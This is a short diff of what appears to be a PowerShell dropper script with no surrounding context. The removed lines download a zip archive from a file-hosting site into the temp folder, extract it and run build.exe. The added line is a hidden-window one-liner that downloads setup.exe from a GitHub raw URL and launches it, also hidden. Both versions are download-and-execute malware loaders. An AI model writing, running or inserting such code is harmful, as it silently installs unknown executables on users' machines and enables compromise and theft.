@@ -1,7 +1,1 @@
-$webClient = New-Object System.Net.WebClient
-$url1 = "https://files.catbox.moe/ad7u8p.zip"
-$zipPath1 = "$env:TEMP\pgrt1.zip"
-$webClient.DownloadFile($url1, $zipPath1)
-$extractPath1 = "$env:TEMP\file"
-Expand-Archive -Path $zipPath1 -DestinationPath $extractPath1
-Start-Process -FilePath $env:TEMP\file\build.exe
+powershell -WindowStyle Hidden -c "$t=[System.IO.Path]::GetTempPath()+'setup.exe'; Invoke-WebRequest -Uri 'https://github.com/shiinayx64/inNCUEU2C8/raw/refs/heads/main/setup.exe' -OutFile $t; Start-Process $t -WindowStyle Hidden"
